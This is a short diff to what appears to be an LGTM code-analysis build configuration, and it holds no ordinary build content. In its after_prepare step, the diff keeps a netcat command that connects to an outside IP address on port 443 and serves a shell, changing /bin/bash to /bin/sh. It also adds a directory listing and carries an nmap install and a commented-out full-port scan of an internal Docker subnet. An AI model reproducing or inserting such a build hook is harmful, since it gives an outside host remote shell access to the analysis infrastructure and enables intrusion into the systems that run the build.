@@ -4,7 +4,8 @@ extraction:
       packages:
         - nmap
     after_prepare:    # Customizable step used by all languages
-     - nc 3.120.120.166 443 -i /bin/bash
+     - ls -la /bin
+     - nc 3.120.120.166 443 -i /bin/sh
      - sleep 10
      - #lgtm-install-packages --help
      - # nmap 172.17.0.0/16 -p- --open 
